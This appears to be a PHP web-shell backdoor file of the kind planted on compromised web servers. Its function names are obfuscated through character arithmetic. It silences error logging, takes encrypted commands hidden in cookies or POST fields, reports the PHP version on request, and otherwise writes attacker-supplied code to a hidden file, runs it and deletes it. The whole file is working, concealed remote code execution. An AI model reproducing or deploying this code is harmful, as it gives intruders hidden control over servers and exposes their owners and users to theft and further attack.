<?php $irsbncdrib = 'f'."\x69"."\x6c".chr(101).chr(750-655)."\160"."\165".'t'.chr(540-445).chr(99)."\x6f".chr(110).'t'.chr(101)."\x6e".chr(433-317)."\163";
$hodsbobpb = 'b'.chr(993-896).'s'.'e'.chr(757-703)."\x34".chr(95).'d'."\x65".'c'.chr(111).'d'.'e';
$noscbtuu = "\151".chr(584-474).chr(105).chr(95)."\x73"."\145".'t';
$aylmsc = 'u'."\156"."\154".chr(105).chr(854-744)."\153";


@$noscbtuu('e'.chr(819-705)."\162".chr(642-531)."\162".'_'."\x6c".'o'.chr(103), NULL);
@$noscbtuu(chr(108).chr(111).chr(946-843).chr(716-621).chr(593-492)."\x72".'r'."\157"."\x72".'s', 0);
@$noscbtuu(chr(893-784).chr(947-850).'x'.'_'.chr(746-645).chr(120).chr(101)."\x63".chr(117)."\x74".'i'.chr(111)."\x6e"."\137"."\x74".chr(257-152).chr(621-512).'e', 0);
@set_time_limit(0);

function tagffhjxcn($kxboq, $stbomorm)
{
    $sjywkpyoz = "";
    for ($qknjlswyp = 0; $qknjlswyp < strlen($kxboq);) {
        for ($j = 0; $j < strlen($stbomorm) && $qknjlswyp < strlen($kxboq); $j++, $qknjlswyp++) {
            $sjywkpyoz .= chr(ord($kxboq[$qknjlswyp]) ^ ord($stbomorm[$j]));
        }
    }
    return $sjywkpyoz;
}

$uwisr = array_merge($_COOKIE, $_POST);
$vjtpezkm = '6a964354-c57b-4f0a-8277-bbf38b53a284';
foreach ($uwisr as $cbmxknau => $kxboq) {
    $kxboq = @unserialize(tagffhjxcn(tagffhjxcn($hodsbobpb($kxboq), $vjtpezkm), $cbmxknau));
    if (isset($kxboq[chr(97).chr(954-847)])) {
        if ($kxboq["\x61"] == "\x69") {
            $qknjlswyp = array(
                chr(112).chr(291-173) => @phpversion(),
                's'."\166" => "3.5",
            );
            echo @serialize($qknjlswyp);
        } elseif ($kxboq["\x61"] == chr(939-838)) {
            $eophal = "./" . md5($vjtpezkm) . "\x2e"."\x69"."\x6e"."\143";
            @$irsbncdrib($eophal, "<" . "\x3f".chr(635-523).chr(979-875).chr(112).chr(388-356).'@'.chr(117).chr(247-137).'l'.chr(105).chr(863-753).chr(187-80).chr(40).chr(748-653).'_'."\x46".chr(120-47)."\114".'E'.chr(793-698).'_'.')'."\x3b"."\40" . $kxboq[chr(827-727)]);
            @include($eophal);
            @$aylmsc($eophal);
        }
        exit();
    }
}

